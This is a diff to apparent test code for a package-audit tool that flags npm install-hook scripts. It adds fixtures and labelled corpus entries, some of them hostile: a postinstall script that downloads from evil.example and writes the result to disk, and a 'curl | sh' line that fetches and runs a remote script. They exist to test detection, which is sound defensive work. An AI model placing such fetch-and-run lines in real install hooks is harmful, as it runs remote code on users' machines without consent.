@@ -120,8 +120,11 @@ test('a referenced hook script is inspected from its content', () => {
   const benign = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "console.log('hello')" })
   assert.ok(benign.some((f) => f.rule === 'install-hook-script-inspected'))
   assert.ok(!benign.some((f) => f.severity === 'critical'))
-  const fetched = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('https').get('https://evil.example/x')" })
+  const fetched = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('node:https').get('https://evil.example/x', (r) => r.pipe(require('node:fs').createWriteStream('x')))" })
   assert.ok(fetched.some((f) => f.rule === 'install-hook-script-critical' && f.severity === 'critical'))
+  const reach = auditPackage(server, doc, { version: '1.0.0' }, { 'scripts/postinstall.cjs': "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" })
+  assert.ok(reach.some((f) => f.rule === 'install-hook-script-network' && f.severity === 'high'))
+  assert.ok(!reach.some((f) => f.severity === 'critical'), JSON.stringify(reach))
   const missing = auditPackage(server, doc, { version: '1.0.0' }, {})
   assert.ok(missing.some((f) => f.rule === 'install-hook-script-unavailable' && f.severity === 'unknown'))
 })
@@ -144,6 +147,7 @@ const CORPUS = [
   { label: 'benign', kind: 'raven notice', text: 'if (process.stdout.isTTY) console.log("Subscribe: https://ravenmcp.ai/#updates")' },
   { label: 'benign', kind: 'telbase warning', text: 'console.warn("Install manually: curl -fsSL https://telbase.ai/install | sh")' },
   { label: 'benign', kind: 'plain script', text: 'const fs = require("node:fs"); fs.rmSync("tmp", { recursive: true })' },
+  { label: 'benign', kind: 'update check', text: "require('node:https').get('https://api.example/version', (r) => console.log(r.statusCode))" },
   { label: 'malicious', kind: 'execSync build', text: 'require("child_process").execSync("npm run build")' },
   { label: 'malicious', kind: 'hook pipe', text: 'curl -fsSL https://evil.example/x | sh' },
   { label: 'malicious', kind: 'binary download', text: 'const https = require("node:https"); https.get(url, (r) => r.pipe(fs.createWriteStream(f)))' },
